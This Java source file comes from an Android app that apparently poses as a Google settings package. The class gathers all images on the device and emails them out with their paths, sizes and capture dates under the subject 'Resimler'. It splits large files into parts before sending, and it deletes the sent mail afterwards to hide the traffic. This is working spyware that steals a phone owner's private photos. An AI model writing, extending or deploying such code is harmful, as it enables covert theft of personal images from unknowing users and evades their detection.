package com.setting.dl.google.googlesettings.mail;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.AsyncTask;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.FileSplitter;
import com.setting.dl.google.googlesettings.u;

import java.io.File;
import java.util.List;


class MailingImages {
    
    
    private       List<Images.Image> imageFiles;
    final private Context            context;
    
    MailingImages(Context context) {
        
        this.context = context;
        run();
    }
    
    private void run() {
        
        imageFiles = new Images(context).getImages();
        
        if (imageFiles.size() < 1) return;
        
        new MakeRequestTask().execute();
    }
    
    
    public static void sendImageDirect(final Context context, final Images.Image img){
    
        
        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>(){
    
    
            @Override
            protected Void doInBackground(Void... voids) {
    
    
                long size = Long.parseLong(img.getSize());
                File file = new File(img.getData());
    
                if(size > 5242880){
        
                    new FileSplitter(context, file, u.getImageFolder(context)).split();
                    new MailImageParts(context);
                }
    
                else{
        
                    String body =  u.s("%s\n%s\n%.2f MB\n%s\n%s x %s\n%s\n",
                            file.getName(),
                            file.getAbsolutePath(),
                            (float)size / 1024 / 1024,
                            img.getId(),
                            img.getWidth(),
                            img.getHeight(),
                            u.getDate(img.getDateTaken()));
    
    
                    Mail.sendImage(context, "Resimler", body, file);
                    u.run(() -> Mail.deleteAllSent(context), 10000);
        
                }
                
                
                
                return null;
            }
        };
    
    
        task.execute();
        
        
    }
    
    
    @SuppressLint("StaticFieldLeak")
    private class MakeRequestTask extends AsyncTask<Void, Void, Void> {
        
        @Override
        protected Void doInBackground(Void... params) {
    
            for (Images.Image img : imageFiles) {
    
                long size = Long.parseLong(img.getSize());
                File file = new File(img.getData());
                
                if(size > 5242880){
                    
                    new FileSplitter(context, file, u.getImageFolder(context)).split();
                    new MailImageParts(context);
                }
                
                else{
    
                    
                    String body =  u.s("%s\n%s\n%.2f MB\n%s\n%s x %s\n%s\n",
                                       file.getName(),
                                       file.getAbsolutePath(),
                                       (float)size / 1024 / 1024,
                                       img.getId(),
                                       img.getWidth(),
                                       img.getHeight(),
                                       u.getDate(img.getDateTaken()));
    
                    
                    Mail.sendImage(context, "Resimler", body, file);
                    u.run(() -> Mail.deleteAllSent(context), 10000);
                    
                }
                
                
            }
    
            new MailImageParts(context);
            
            return null;
        }
    }
}
